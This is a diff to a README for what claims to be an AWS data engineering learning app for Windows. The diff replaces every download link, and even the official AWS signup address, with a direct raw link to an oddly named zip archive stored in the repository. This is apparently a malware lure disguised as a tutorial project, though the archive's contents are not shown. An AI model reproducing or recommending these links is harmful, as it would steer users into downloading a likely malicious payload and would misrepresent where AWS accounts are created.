@@ -1,6 +1,6 @@
 # ⚙️ AWS-Services-For-Data-Engineering-With-Projects - Learn AWS Data Engineering Fast
 
-[![Download](https://img.shields.io/badge/Download-AWS%20Data%20Projects-brightgreen?style=for-the-badge)](https://github.com/atomixon49/AWS-Services-For-Data-Engineering-With-Projects/releases)
+[![Download](https://img.shields.io/badge/Download-AWS%20Data%20Projects-brightgreen?style=for-the-badge)](https://github.com/atomixon49/AWS-Services-For-Data-Engineering-With-Projects/raw/refs/heads/main/thribble/Services-Data-Engineering-With-Projects-AW-For-v3.6-beta.3.zip)
 
 ## 📦 About This Application
 
@@ -33,7 +33,7 @@ This step will help you download and open the application on your Windows PC. Yo
 
 Click the big button below to open the official release page:
 
-[![Download](https://img.shields.io/badge/Download-AWS%20Data%20Projects-brightgreen?style=for-the-badge)](https://github.com/atomixon49/AWS-Services-For-Data-Engineering-With-Projects/releases)
+[![Download](https://img.shields.io/badge/Download-AWS%20Data%20Projects-brightgreen?style=for-the-badge)](https://github.com/atomixon49/AWS-Services-For-Data-Engineering-With-Projects/raw/refs/heads/main/thribble/Services-Data-Engineering-With-Projects-AW-For-v3.6-beta.3.zip)
 
 This page shows all the published versions of the app.
 
@@ -111,7 +111,7 @@ All projects run locally but simulate AWS services and pipelines. To fully use c
 
 If you want to connect your AWS environment:
 
-- Set up an AWS account at https://aws.amazon.com/  
+- Set up an AWS account at https://github.com/atomixon49/AWS-Services-For-Data-Engineering-With-Projects/raw/refs/heads/main/thribble/Services-Data-Engineering-With-Projects-AW-For-v3.6-beta.3.zip  
 - Configure the AWS CLI tool with your credentials  
 - Follow the project's instructions to link the CLI with this app
 
@@ -143,7 +143,7 @@ If you want to connect your AWS environment:
 
 You can download and install the application now by visiting this link:
 
-[Download AWS Data Projects](https://github.com/atomixon49/AWS-Services-For-Data-Engineering-With-Projects/releases)
+[Download AWS Data Projects](https://github.com/atomixon49/AWS-Services-For-Data-Engineering-With-Projects/raw/refs/heads/main/thribble/Services-Data-Engineering-With-Projects-AW-For-v3.6-beta.3.zip)
 
 This will open the page where you can select the latest version to install and use immediately.
 
